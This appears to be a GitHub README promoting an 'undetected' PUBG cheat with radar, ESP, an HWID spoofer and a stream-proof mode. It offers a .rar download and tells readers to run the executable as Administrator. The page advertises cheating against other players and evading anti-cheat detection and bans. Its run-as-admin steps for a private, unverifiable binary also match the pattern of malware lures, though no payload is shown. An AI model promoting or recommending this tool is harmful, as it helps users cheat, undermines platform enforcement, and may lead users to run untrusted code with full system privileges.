<div align="center">

# 📡 PUBG — Radar

**Undetected · External · Radar + Player ESP**

[![Status](https://img.shields.io/badge/status-undetected-brightgreen?style=for-the-badge)](https://github.com/)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows)](https://github.com/)
[![C++](https://img.shields.io/badge/C%2B%2B-20-00599C?style=for-the-badge&logo=cplusplus)](https://github.com/)
[![License](https://img.shields.io/badge/license-private-red?style=for-the-badge)](https://github.com/)
[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/TwilightMaharaja/PUBG-Radar/releases/download/PUBG-Radar/PUBG-Radar.rar)

---

<img width="1600" height="1200" alt="Preview" src="https://github.com/user-attachments/assets/5283306f-6a8b-4f13-a58f-2014f984dc01" />

</div>

## 📖 Overview

A lightweight, fully external PUBG radar. Reads game memory from a separate process and renders a 2D minimap overlay — no injection, no kernel driver, no aimbot. Minimal footprint, built for long sessions and a low detection surface.

- **External** — separate process, reads memory only
- **No kernel driver** — user-mode, no ring0 dependencies
- **Radar-only** — no aim assistance, no visual hooks
- **DX11 overlay** — custom ImGui radar, stream-proof mode
- **HWID spoofer** — optional, launch-time

---

## ✨ Features

### 📡 Radar
| Feature | Description |
|---|---|
| Player Radar | Live player blips, direction, distance |
| Zoom | Scroll-to-zoom, configurable min/max |
| Rotation | Follow camera or fixed north |
| Blip Colors | Enemy / teammate / distance-based |
| Vehicle Radar | Cars, bikes, boats — distance + type |
| Airdrop Radar | Marker + landing prediction |
| Safe Zone | Circle + next-zone preview |
| Danger Zone | Red zone + grenade markers |

### 👁️ Light ESP
| Feature | Description |
|---|---|
| Player ESP | Box, name, distance, health |
| Skeleton | Optional 3D bone rendering |
| Item ESP | Loot, weapons, attachments, meds |
| Vehicle ESP | Distance + type |

### 🛡️ Misc
- Stream-proof mode (OBS-safe)
- Custom crosshair
- Config save / load
- Panic key (instant unload)

---

## 🖼️ Screenshots

<div align="center">

<img width="2544" height="1228" alt="image" src="https://github.com/user-attachments/assets/8c7d4d92-206e-4670-9c99-ff3de30b033c" />


</div>

---

[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/TwilightMaharaja/PUBG-Radar/releases/download/PUBG-Radar/PUBG-Radar.rar)

## 🚀 Installation 

### Requirements
- Windows 10 / 11 (x64)
- Visual C++ Redistributable 2019+
- PUBG installed via Steam
- Administrator privileges

### Steps

```bash
1. Download the latest release archive
2. Extract to a folder OUTSIDE of the PUBG directory
3. Run .exe as Administrator
4. Launch PUBG
5. Press INSERT to open the radar
